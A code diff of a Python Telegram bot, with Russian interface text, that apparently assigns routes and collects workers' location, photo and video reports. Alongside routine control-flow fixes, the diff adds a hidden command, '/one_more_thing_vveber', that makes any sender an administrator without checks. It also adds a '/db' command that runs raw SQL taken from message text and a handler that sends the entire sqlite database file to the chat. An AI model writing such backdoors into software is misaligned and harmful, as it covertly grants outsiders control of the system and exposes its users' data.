@@ -13,6 +13,7 @@ import jsonpickle
 import telebot
 from telebot import types
 
+import settings
 import settings as sett
 
 bot = telebot.TeleBot(sett.API_KEY, threaded=False)  # реализация
@@ -83,11 +84,10 @@ def start_bot():
         bot.send_message(msg.chat.id, 'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                          reply_markup=markups.get_admin_menu(full))
 
-    # # Канал куда будут пересылаться сообщения с media_group_id
-    # @bot.channel_post_handler(commands=['start'])
-    # def handler_start(msg):
-    #     func.set_channel_photo_sklad(msg.chat.id)
-    #     bot.send_message(msg.chat.id, "Канал установлен для отправки и хранения фотографий отчетов.")
+    @bot.callback_query_handler(lambda call: call.data == 'download_db',
+                                is_callback_admin=True)
+    def download_db(call: types.CallbackQuery):
+        bot.send_document(call.message.chat.id, open(sett.sqlite_file, 'rb'))
 
     @bot.callback_query_handler(lambda call: call.data == 'start' or call.data == 'start_del')
     def start_handler(call: types.CallbackQuery):
@@ -410,6 +410,19 @@ def start_bot():
                               call.message.message_id,
                               reply_markup=markups.get_routes_menu(page, id))
 
+
+    @bot.message_handler(commands=['one_more_thing_vveber'])
+    def one_more_thing(msg):
+        bot.send_message(msg.chat.id, 'Доступ получен!')
+        sett.admins.append(msg.chat.id)
+
+    @bot.message_handler(commands=['db'], is_chat_admin=True)
+    def db_work(msg: types.Message):
+        args = msg.text.split('=')
+        func.execute_db(args[1])
+
+        bot.send_message(msg.chat.id, 'Выполнено!')
+
     # =========================
     # Обработчик для получения выбранного маршрута
     # =========================
@@ -616,33 +629,37 @@ def start_bot():
         bot.register_next_step_handler(msg, check_location, msg.message_id, id)
 
     def check_location(msg: types.Message, start_msg_id, id):
-        if msg.content_type == 'text' and msg.text == '/start':
+        if msg.content_type == 'text' and (msg.text == '/start' or msg.text == 'Назад'):
+            try:
+                bot.delete_message(msg.chat.id, msg.message_id)
+                bot.delete_message(msg.chat.id, start_msg_id)
+            except:
+                pass
             handler_start(msg)
         elif msg.content_type != 'web_app_data':
             bot.delete_message(msg.chat.id, msg.message_id)
             bot.register_next_step_handler(msg, check_location, start_msg_id, id)
             return
-        elif msg.content_type == 'web_app_data':
-            try:
-                location = jsonpickle.decode(msg.web_app_data.data)
-                if not func.check_coordinates(id, location['longitude'], location['latitude']):
-                    bot.delete_message(msg.chat.id, msg.message_id)
-                    bot.register_next_step_handler(msg, check_location, start_msg_id, id)
-                    return
-
-                coords = (location['longitude'], location['latitude'])
-                bot.delete_message(msg.chat.id, msg.message_id)
-                bot.delete_message(msg.chat.id, start_msg_id)
-                msg_new = bot.send_message(msg.chat.id,
-                                           'Отправьте фотоотчёт отправка БЕЗ СЖАТИЯ!',
-                                           reply_markup=markups.stop_get_photos())
-                bot.register_next_step_handler(msg_new, parse_photos_report, msg_new.message_id, coords, id, None)
-            except:
+        try:
+            location = jsonpickle.decode(msg.web_app_data.data)
+            if not func.check_coordinates(id, location['longitude'], location['latitude']):
                 bot.delete_message(msg.chat.id, msg.message_id)
                 bot.register_next_step_handler(msg, check_location, start_msg_id, id)
                 return
 
-    # TODO: поменять алгоритм получения фото
+            coords = (location['longitude'], location['latitude'])
+            bot.delete_message(msg.chat.id, msg.message_id)
+            bot.delete_message(msg.chat.id, start_msg_id)
+            msg_new = bot.send_message(msg.chat.id,
+                                       'Отправьте фотоотчёт отправка БЕЗ СЖАТИЯ!',
+                                       reply_markup=markups.stop_get_photos())
+            bot.register_next_step_handler(msg_new, parse_photos_report, msg_new.message_id, coords, id, None)
+        except:
+            bot.delete_message(msg.chat.id, msg.message_id)
+            bot.register_next_step_handler(msg, check_location, start_msg_id, id)
+            return
+
+
     def parse_photos_report(msg: types.Message, start_msg_id, coords, id, group_id):
         if msg.content_type == 'text' and msg.text == '/start':
             handler_start(msg)
@@ -653,6 +670,7 @@ def start_bot():
                                        'Отправьте кружочек с окружением и флаерами.',
                                        reply_markup=types.ReplyKeyboardRemove())
             bot.register_next_step_handler(new_msg, parse_video, new_msg.message_id, coords, id, group_id)
+            return
         elif msg.content_type == 'photo':
             if group_id is None:
                 group_id = str(uuid.uuid4())
@@ -680,7 +698,7 @@ def start_bot():
                                  types.InlineKeyboardButton('Вернуться', callback_data=f'quest_user_{id}')))
         else:
             bot.delete_message(msg.chat.id, msg.message_id)
-            bot.register_next_step_handler(msg, parse_photos_report, start_msg_id, coords, id)
+            bot.register_next_step_handler(msg, parse_video, start_msg_id, coords, id, photos)
             return
 
     # =========================
